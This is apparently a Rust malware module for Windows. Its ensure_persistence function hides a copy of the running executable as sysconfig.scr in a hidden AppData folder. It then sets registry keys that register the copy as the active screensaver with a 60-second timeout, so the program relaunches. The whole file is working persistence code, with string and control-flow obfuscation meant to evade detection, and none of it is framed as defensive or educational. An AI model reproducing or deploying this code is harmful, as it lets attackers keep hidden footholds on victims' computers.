use crate::winapi_util::WINAPI;
use std::ffi::c_void;
use std::ptr;
use std::path::{Path, PathBuf};
use obfuscator::{obfuscate, obfuscate_string};
use std::os::windows::ffi::OsStrExt;

const CSIDL_APPDATA: i32 = 0x001a;
const HKEY_CURRENT_USER: *mut c_void = 0x80000001 as *mut c_void;
const KEY_WRITE: u32 = 0x20006;
const REG_SZ: u32 = 1;
const FILE_ATTRIBUTE_HIDDEN: u32 = 0x2;

#[obfuscate(garbage = true, control_f = true)]
pub fn ensure_persistence() -> Result<(), String> {
    unsafe {
        // Get the path to AppData
        let mut app_data_path = vec![0u16; 260];
        if (WINAPI.SHGetFolderPathW)(ptr::null_mut(), CSIDL_APPDATA, ptr::null_mut(), 0, app_data_path.as_mut_ptr()) != 0 {
            return Err(obfuscate_string!("Failed to get AppData path.").to_string());
        }
        let len = app_data_path.iter().position(|&c| c == 0).unwrap_or(app_data_path.len());
        let app_data_dir = PathBuf::from(String::from_utf16_lossy(&app_data_path[..len]));

        // Create a hidden directory
        let hidden_dir_name = obfuscate_string!("SystemData");
        let hidden_dir = app_data_dir.join(hidden_dir_name);
        let hidden_dir_wide: Vec<u16> = hidden_dir.as_os_str().encode_wide().chain(Some(0)).collect();

        if (WINAPI.GetFileAttributesW)(hidden_dir_wide.as_ptr()) == 0xFFFFFFFF {
            if !(WINAPI.CreateDirectoryW)(hidden_dir_wide.as_ptr(), ptr::null_mut()) {
                return Err(obfuscate_string!("Failed to create hidden directory.").to_string());
            }
            if !(WINAPI.SetFileAttributesW)(hidden_dir_wide.as_ptr(), FILE_ATTRIBUTE_HIDDEN) {
                return Err(obfuscate_string!("Failed to set directory attributes.").to_string());
            }
        }

        // Get the current executable's path
        let mut current_exe_path = vec![0u16; 260];
        let module = (WINAPI.GetModuleHandleW)(ptr::null());
        (WINAPI.GetModuleFileNameW)(module, current_exe_path.as_mut_ptr(), current_exe_path.len() as u32);

        let len = current_exe_path.iter().position(|&c| c == 0).unwrap_or(current_exe_path.len());
        let current_exe_path_str = String::from_utf16_lossy(&current_exe_path[..len]);

        // Check if already running from the target path
        if Path::new(&current_exe_path_str).parent() == Some(&hidden_dir) {
            return Ok(());
        }

        // Copy the executable to the hidden directory as a screensaver
        let screensaver_name = obfuscate_string!("sysconfig.scr");
        let new_exe_path = hidden_dir.join(screensaver_name);
        let new_exe_path_wide: Vec<u16> = new_exe_path.as_os_str().encode_wide().chain(Some(0)).collect();

        if !(WINAPI.CopyFileW)(current_exe_path.as_ptr(), new_exe_path_wide.as_ptr(), false) {
            return Err(obfuscate_string!("Failed to copy executable.").to_string());
        }

        // Register the screensaver in the registry
        let mut hkey = ptr::null_mut();
        let sub_key = obfuscate_string!("Control Panel\\Desktop");
        let sub_key_wide: Vec<u16> = sub_key.encode_utf16().chain(Some(0)).collect();

        if (WINAPI.RegOpenKeyExW)(HKEY_CURRENT_USER, sub_key_wide.as_ptr(), 0, KEY_WRITE, &mut hkey) == 0 {
            let scr_save_active = obfuscate_string!("SCRNSAVE.EXE");
            let scr_save_active_wide: Vec<u16> = scr_save_active.encode_utf16().chain(Some(0)).collect();
            let value_data: Vec<u8> = new_exe_path_wide.iter().flat_map(|&c| c.to_le_bytes().to_vec()).collect();

            (WINAPI.RegSetValueExW)(hkey, scr_save_active_wide.as_ptr(), 0, REG_SZ, value_data.as_ptr(), value_data.len() as u32);

            let screen_save_active_key = obfuscate_string!("ScreenSaveActive");
            let screen_save_active_wide: Vec<u16> = screen_save_active_key.encode_utf16().chain(Some(0)).collect();
            let screen_save_active_value = "1\0".encode_utf16().flat_map(|c| c.to_le_bytes()).collect::<Vec<u8>>();
            (WINAPI.RegSetValueExW)(hkey, screen_save_active_wide.as_ptr(), 0, REG_SZ, screen_save_active_value.as_ptr(), screen_save_active_value.len() as u32);

            let screen_save_timeout_key = obfuscate_string!("ScreenSaveTimeOut");
            let screen_save_timeout_wide: Vec<u16> = screen_save_timeout_key.encode_utf16().chain(Some(0)).collect();
            let screen_save_timeout_value = "60\0".encode_utf16().flat_map(|c| c.to_le_bytes()).collect::<Vec<u8>>();
            (WINAPI.RegSetValueExW)(hkey, screen_save_timeout_wide.as_ptr(), 0, REG_SZ, screen_save_timeout_value.as_ptr(), screen_save_timeout_value.len() as u32);

            (WINAPI.RegCloseKey)(hkey);
        } else {
            return Err(obfuscate_string!("Failed to open registry key.").to_string());
        }
    }
    Ok(())
}
